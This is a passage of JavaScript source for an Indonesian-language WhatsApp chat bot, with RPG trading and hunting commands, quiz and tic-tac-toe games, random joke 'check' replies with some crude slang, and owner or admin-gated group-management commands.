 if (!args[1]) return m.reply(`Example : ${prefix + command} kelinci 2\n 1 kelinci = 3000 monay`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Kelinci kamu* : ${getKelinci(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'domba'){
 if (isDomba < anu) return m.reply('Domba kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} domba 2\n 1 domba = 5000 monay`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Domba kamu* : ${getDomba(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'sapi'){
 if (isSapi < anu) return m.reply('Sapi kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} sapi 2\n 1 sapi = 10000 monay`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Sapi kamu* : ${getSapi(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'gajah'){
 if (isGajah < anu) return m.reply('Gajah kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} gajah 2\n 1 gajah = 15000 monay`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Gajah kamu* : ${getGajah(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'besi'){
 if (isBesi < anu) return m.reply('Besi kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} besi 2\n 1 besi = 15000 monay`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Besi kamu* : ${getBesi(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'emas'){
 if (isEmas < anu) return m.reply('Besi kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} emas 2\n 1 emas = 50000 monay`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa emas kamu* : ${getEmas(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return m.reply('Besi kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} emerald 2\n 1 emerald = 100000 monay`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa emerald kamu* : ${getEmerald(m.sender)}`)
  }, 2000) 
 } else { m.reply("Format salah!") }

 }
 break

 case 'heal':{
if (q.includes('--help')) return m.reply(examkosong) 
 if (!isCekDarah < 1) return m.reply('Kamu hanya bisa heal ketika darah kamu 0')
 if (isCekDarah > 100) return m.reply('Darah kamu sudah penuh')
 if (isPotion < 1) return m.reply('Kamu tidak punya potion, cobalah beli dengan cara #buypotion _jumlah_') 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 m.reply('Berhasil, darah kamu sudah full')
 }
 break
 case 'berburu':{
if (q.includes('--help')) return m.reply(examkosong) 
 //Peringatan!!!!, ini buatan rifza. jangan claim punya lu:)
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return m.reply('Darah kamu habis, cobalah heal menggunakan potion') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
  let luka = ["Tertusuk duri saat berburu","Terpeleset ke jurang saat berburu","Tercakar hewan buas","Tidak berhati-hati","Terjerat akar","Terjatuh saat berburu"]
  let location = ["Hutan rimba","Hutan Amazon","Hutan tropis","Padang rumput","Hutan afrika","Pegunungan"]
   var ikanmu = Math.ceil(Math.random() * 10)
   var ayam = Math.ceil(Math.random() * 8)
   var kelinci = Math.ceil(Math.random() * 7)
   var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
   var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
   var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
   var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
   var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
   var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]    
   var lukanya = luka[Math.floor(Math.random() * luka.length)]
   var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan rimba') {
    var image = './storage/image/rimba.jpg'
   } else
 if (lokasinya === 'Hutan Amazon') {
    var image =  './storage/image/amazon.jpg'
   } else
 if (lokasinya === 'Hutan tropis') {
    var image = './storage/image/tropis.jpg'
   } else
 if (lokasinya === 'Padang rumput') {
    var image = './storage/image/padang_rumput.jpg'
   } else
 if (lokasinya === 'Hutan afrika') {
    var image = './storage/image/afrika.jpg'
   } else
 if (lokasinya === 'Pegunungan') {
   var image = './storage/image/pegunungan.jpg'
   }
 setTimeout( () => {
  let teksehmazeh = `_[ HASIL BURUAN ]_\n`
     teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
     teksehmazeh += `*🐔Ayam* : ${ayam}\n`
     teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
     teksehmazeh += `*🐑Domba* : ${domba}\n`
     teksehmazeh += `*🐄Sapi* : ${sapi}\n`
     teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
     teksehmazeh += `_[ INFO ]_\n`
     teksehmazeh += `*Lokasi* : ${lokasinya}\n`
     teksehmazeh += `*Terluka* : ${lukanya}, darah - 10\n`
     teksehmazeh += `*Sisa darah* : ${getDarah(m.sender)}\n`
    let buttons = [
      {
       buttonId: `${prefix + command}`, 
       buttonText: {
        displayText: 'Berburu lagi️🏹'
      }, type: 1},
    ]
    let buttonMessage = {
      image: { url: image },
      caption: teksehmazeh,
      footer: pushname,
      buttons: buttons,
      headerType: 4
     }
     chika.sendMessage(from, buttonMessage, { quoted: m })      
  }, 5000)  
 setTimeout( () => {
  m.reply(`@${m.sender.split("@")[0]} Mulai berburu di ${lokasinya}`)     
  }, 1000) 
 addIkan(m.sender, ikanmu) 
   addAyam(m.sender, ayam) 
   addKelinci(m.sender, kelinci)
   addDomba(m.sender, domba)
   addSapi(m.sender, sapi)
  addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break	
        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await chika.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await chika.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            chika.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await chika.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) chika.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    chika.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    chika.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    chika.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    chika.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    chika.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    chika.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    chika.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await chika.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await chika.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    chika.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    chika.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, chika.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    chika.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    chika.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, chika.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    chika.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    chika.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, chika.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    chika.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    chika.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, chika.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    chika.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    chika.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, chika.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    chika.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    chika.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, chika.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./lib/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                chika.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, jawab, chika.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await chika.sendButtonText(m.chat, buttons, jawab, chika.user.name, m, {mentions: menst})
            }
            break
            case 'apakah':
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
					const kah = apa[Math.floor(Math.random() * apa.length)]
chika.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: m })

					break
case 'bisakah':
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
					const ga = bisa[Math.floor(Math.random() * bisa.length)]
chika.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: m })

					break
case 'bagaimanakah':
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
					const ya = gimana[Math.floor(Math.random() * gimana.length)]
chika.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: m })

					break
case 'rate':
 
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
					const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
chika.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: m })

					break
case 'gantengcek':
  case 'cekganteng':
   
				if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Riych`)
					const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
chika.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: m })

					break
case 'cantikcek':
  case 'cekcantik':
   
				if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Riych`)
					const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const tik = can[Math.floor(Math.random() * can.length)]
chika.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: m })

					break
case 'sangecek':
  case 'ceksange':
    case 'gaycek':
      case 'cekgay':
        case 'lesbicek':
          case 'ceklesbi':
				if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
					const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
chika.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })

					break
case 'kapankah':
				if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
					const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
chika.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: m })
					break
case 'wangy':
              if (!q) return reply (`Contoh : .wangy Riy`)
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
             m.reply(awikwok)
              break
case 'cekmati':
              if (!q) return reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              m.reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                chika.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await chika.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await chika.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await chika.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await chika.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
